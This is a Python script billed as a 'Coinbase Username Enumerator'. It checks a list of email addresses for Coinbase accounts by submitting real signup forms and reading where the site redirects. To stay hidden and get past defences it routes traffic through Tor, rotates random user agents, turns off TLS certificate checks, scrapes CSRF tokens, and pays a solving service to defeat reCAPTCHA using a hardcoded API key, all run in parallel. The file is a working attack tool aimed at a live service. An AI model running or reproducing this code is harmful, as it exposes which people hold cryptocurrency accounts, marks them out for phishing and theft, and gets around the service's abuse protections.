#!/usr/bin/env python3
import ssl
import tqdm
import time
import sqlite3
import argparse
import requests
import urllib.parse
import urllib.error
import urllib.request
import http.cookiejar
import socks
import socket
from pathos.helpers import cpu_count
from pathos.multiprocessing import ProcessingPool as Pool
from randomlib import GenerateRandoms
from bs4 import BeautifulSoup
from colorama import init
from colorama import Fore, Back, Style
from stem.control import Controller
import stem
import stem.process


def print_bootstrap_lines(line):
    print(Fore.LIGHTBLUE_EX + line)


def tor_proxy_handler():
    SOCKS_PORT = 9050
    CTRL_PORT = 9051
    # To use specific country, select ExitNodes: '{ru}' for Russia, for example
    config = {'SocksPort': str(SOCKS_PORT),
              'ControlPort': str(CTRL_PORT),
              'ExitNodes': '{us}'}
    try:
        tor_process = stem.process.launch_tor_with_config(config, init_msg_handler=print_bootstrap_lines)
        return tor_process
    except Exception as e:
        print(e)


def check_tor_status():
    result = {}
    response = ''

    try:
        with Controller.from_port(port=9051) as controller:

            controller.authenticate()
            response = controller.get_info("status/bootstrap-phase")
            controller.close()

    except Exception as e:
        print(e)
        pass

    if response.find('SUMMARY="Done"') > 0:
        print("bootstrapped OK")
        result['tor_status'] = True
    else:
        print("Bootstrap not finished: " + response)
        result['tor_status'] = False

    return result


def solve_captcha():

    service_key = 'd9dd9f0e23896d407f2b5d04528ae10d' # 2captcha service key
    # COINBASE GOOGLE SITE KEY: div class="g-recaptcha " data-sitekey="6LcWsCUTAAAAAGLDiA07ZXepjn-EdSh4xd1I7PKH">
    google_site_key = '6LcWsCUTAAAAAGLDiA07ZXepjn-EdSh4xd1I7PKH'
    pageurl = 'https://www.coinbase.com/signup'
    url = "http://2captcha.com/in.php?key=" + service_key + "&method=userrecaptcha&googlekey=" + google_site_key + "&pageurl=" + pageurl
    resp = requests.get(url)
    if resp.text[0:2] != 'OK':
        quit('Service error. Error code:' + resp.text)
    captcha_id = resp.text[3:]
    fetch_url = "http://2captcha.com/res.php?key=" + service_key + "&action=get&id=" + captcha_id

    print("[~] Waiting for reCaptcha solve token....")
    for i in range(1, 60):
        print("[~] Waiting 5 seconds (%d/60)..." % i)
        time.sleep(5)  # wait 5 sec.
        resp = requests.get(fetch_url)
        if resp.text[0:2] == 'OK':
            captcha_solve = resp.text[3:]
            break
        else:
            captcha_solve = None

    print('[+] Google response token: ', captcha_solve)
    return captcha_solve


def coinbase_signup_get(email, rand_agent, cookies):

    url = "https://www.coinbase.com/signup"

    socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050, True)
    socket.socket = socks.socksocket

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # ADD FOR LOCAL PROXY SUPPORT: urllib.request.ProxyHandler({'https': 'http://127.0.0.1:8080')
    handlers = [
        urllib.request.HTTPHandler(),
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(cookies)
    ]

    opener = urllib.request.build_opener(*handlers)

    headers = {'User-Agent': rand_agent}

    req = urllib.request.Request(url, headers=headers)

    try:

        resp = opener.open(req)
        html = resp.read()

        soup = BeautifulSoup(html, 'html.parser')
        # BYPASS CSRF TOKEN, looks like this: <meta name="csrf-token" content="base64stringhere" />
        # soup.find('input', {'id': 'personalVat'})
        csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
        return csrf_token

    except Exception as e:

        print("[!] Error processing enumeration during GET with email: %s" % email)
        print("[!] Extended Error information: %s" % e)
        return None


def coinbase_signup_post(email, googlekey, csrf_token, rand_agent, cookies):

    url = "https://www.coinbase.com/users"

    socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050, True)
    socket.socket = socks.socksocket

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # ADD FOR LOCAL PROXY SUPPORT: urllib.request.ProxyHandler({'https': 'http://127.0.0.1:8080'})
    handlers = [
        urllib.request.HTTPHandler(),
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(cookies)
    ]

    opener = urllib.request.build_opener(*handlers)

    headers = {'User-Agent': rand_agent,
               'Content-Type': 'application/x-www-form-urlencoded',
               'Referer': 'https://www.coinbase.com/signup',
               'Host': 'www.coinbase.com',
               'DNT': 1}

    name = GenerateRandoms.generate_fname_lname()

    form_data = {'utf8': '✓',
                 "authenticity_token": csrf_token,
                 "user[first_name]": name[0],
                 'user[last_name]': name[1],
                 'user[email]': email,
                 'user[password]': GenerateRandoms.generate_password(),
                 'user[residential_address_attributes][state]': GenerateRandoms.generate_state(),
                 'g-recaptcha-response': googlekey,
                 'user[accepted_user_agreement]': 1,
                 'commit': 'Create account'
                 }

    data = urllib.parse.urlencode(form_data).encode("utf-8")

    req = urllib.request.Request(url, headers=headers)
    try:
        resp = opener.open(req, data)
        response_url = resp.geturl()
        print("[~] Checking Response...")
        if response_url == 'https://www.coinbase.com/signin':
            print(Fore.GREEN + ("[+] FOUND VALID EMAIL: %s" % email))
            return {'Email': email, 'hasAccount': True}

        elif response_url == "https://www.coinbase.com/dashboard":

            return {'Email': email, 'hasAccount': False}

        elif response_url == "https://www.coinbase.com/users/verify":

            return {'Email': email, 'hasAccount': False}

        elif response_url == "https://www.coinbase.com/users":

            print("[!] Error! reCaptcha failed for email %s" % email)
            return {'Email': email, 'hasAccount': None}

        else:
            print("[!] Email %s failed due to unknown redirect url: %s" % (email, response_url))
            raise AssertionError

    except Exception as e:
        print("[!] Error processing enumeration during POST with email: %s" % email)
        print("[!] Extended Error information: %s" % e)
        return {'Email': email, 'hasAccount': None}


def coinbase_enum_worker(email):

    """enumerate a coinbase user by email address via registration signup attempt"""
    # First, solve a reCaptcha.
    googlekey = solve_captcha()
    if googlekey is None:

        return {'Email': email, 'hasAccount': None}

    # Enter your user agent here, or use a random one.
    rand_agent = GenerateRandoms.generate_useragent()
    # rand_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:54.0) Gecko/20100101 Firefox/54.0"
    cookies = http.cookiejar.LWPCookieJar()
    csrf_token = coinbase_signup_get(email, rand_agent, cookies)

    if csrf_token is None:

        return {'Email': email, 'hasAccount': None}

    enum_result = coinbase_signup_post(email, googlekey, csrf_token, rand_agent, cookies)
    # print(enum_result)
    return enum_result


def coinbase_enum_handler(file, threads):
    """enumerate a coinbase user by email address via registration signup attempt"""

    pool = Pool(processes=threads)

    with open(file, 'r') as f:

        rows = f.readlines()

    print(Fore.LIGHTCYAN_EX + ("[*] Enumerating %s users with %s threads..." % (len(rows), threads)))
    total_found = 0
    total_retry = 0
    total_invalid = 0

    for result in tqdm.tqdm(pool.imap(coinbase_enum_worker, rows), total=len(rows)):

        if result['hasAccount'] is True:

            print(Fore.GREEN + ("[$] Email: %s has account on Coinbase!" % result['Email']))
            total_found += 1

        elif result['hasAccount'] is None:

            print(Fore.YELLOW + ("[^] Email: %s needs to be retried" % result['Email']))
            total_retry += 1

        elif result['hasAccount'] is False:

            print(Fore.LIGHTRED_EX + ("[-] Email: %s does is not registered on Coinbase." % result['Email'])
                  )
            total_invalid += 1

        else:
            print("[?] Something fucked up???")

    print(Fore.CYAN + ("Found %s/%s users with Coinbases accounts. %s were invalid." % (total_found, str(len(rows)),
                                                                                        total_invalid)))
    print(Fore.YELLOW + ("Found %s/%s users that need to be retried." % (total_retry, str(len(rows)))))


if __name__ == "__main__":

    banner = """
 ██████╗ ██████╗ ██╗███╗   ██╗███████╗███╗   ██╗██╗   ██╗███╗   ███╗
██╔════╝██╔═══██╗██║████╗  ██║██╔════╝████╗  ██║██║   ██║████╗ ████║
██║     ██║   ██║██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
██║     ██║   ██║██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
╚██████╗╚██████╔╝██║██║ ╚████║███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
 ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
                                                                    
"""
    init(autoreset=True)
    print(Fore.RED + banner)
    default_threads = cpu_count()

    parser = argparse.ArgumentParser(description='Coinbase Username Enumerator.')
    parser.add_argument('-f', '--file', action='store', dest='file',
                        help='Input the path to a list of emails to check', required=True)
    parser.add_argument('-t', '--threads', action='store', dest='threads',
                        help="Number of threads to use. This is bound by reCaptcha solving, "
                              "so you can use a high amount", default=default_threads)
    args = parser.parse_args()

    tor_proxy_handler()

    if check_tor_status():
        print(Fore.GREEN + "[*] Bootstrap OK.")
        coinbase_enum_handler(args.file, args.threads)

    else:
        print(Fore.RED + "TOR NOT RUNNING, EXITING.")
